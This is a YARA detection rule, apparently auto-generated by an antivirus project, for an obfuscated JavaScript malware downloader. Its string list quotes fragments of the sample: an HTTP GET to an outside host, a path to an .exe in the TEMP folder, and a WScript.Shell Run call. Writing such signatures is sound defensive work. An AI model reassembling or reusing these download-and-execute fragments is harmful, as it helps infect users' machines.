rule sig_20160328_cd530e465368698784315525ad1dea47 {
  meta:
    description = "datamaliciousorder - file 20160328_cd530e465368698784315525ad1dea47.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "df0315c348deb9d5c0e31d8c095ffba02e6d17fc5d362755106a8681e215a799"

  strings:
    $s1  = "function Jxcjss() {return Cneysq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bAvHNNPANY6TL.exe\";};" fullword ascii
    $s2  = "do {WScript[Eddssxpq](Qmroipbuut() * 11)} while (Ppzthl[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Cneysq = function Dknssjx() {return WScript[Sifkjp](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Ppzthl[Dkjyw](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s5  = "function Tewyu(Seziwxxmi, Dvkpyixyz){return Seziwxxmi - Dvkpyixyz;};" fullword ascii
    $s6  = "function Fpdwhrm(Cgpmaqoy){Cneysq[\"Run\"](Cgpmaqoy, Fcgoiyztk, Fcgoiyztk);};" fullword ascii
    $s7  = "function Mnvfle() {return ((Jtsfbj == true) && (Jtsfbj == Wcntlpro)) ? 1 : Fcgoiyztk;};" fullword ascii
    $s8  = "var Zlmivxjsm = false;" fullword ascii
    $s9  = "function Qmroipbuut(){return 22;};" fullword ascii
    $s10 = "var Peuffdz = new this[\"Date\"]();" fullword ascii
    $s11 = "var Wcntlpro = false;" fullword ascii
    $s12 = "function Zdfpabc(){return Sifkjp;};" fullword ascii
    $s13 = " while (Fqomqalt){" fullword ascii
    $s14 = "function Vgrhckfmhi(Gnekss) {var Yisrtcsunr = (1, 2, 3, 4, 5, Gnekss); return Yisrtcsunr;};" fullword ascii
    $s15 = "var Jtsfbj = false;" fullword ascii
    $s16 = "Wcntlpro = true; " fullword ascii
    $s17 = "function Trgvhw(){return Jnaqgzbre;};" fullword ascii
    $s18 = "return Tewyu(Zegtiwyywp, Gwdzmgu);" fullword ascii
    $s19 = "function Wkyyyrkmy()" fullword ascii
    $s20 = "Jtsfbj = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}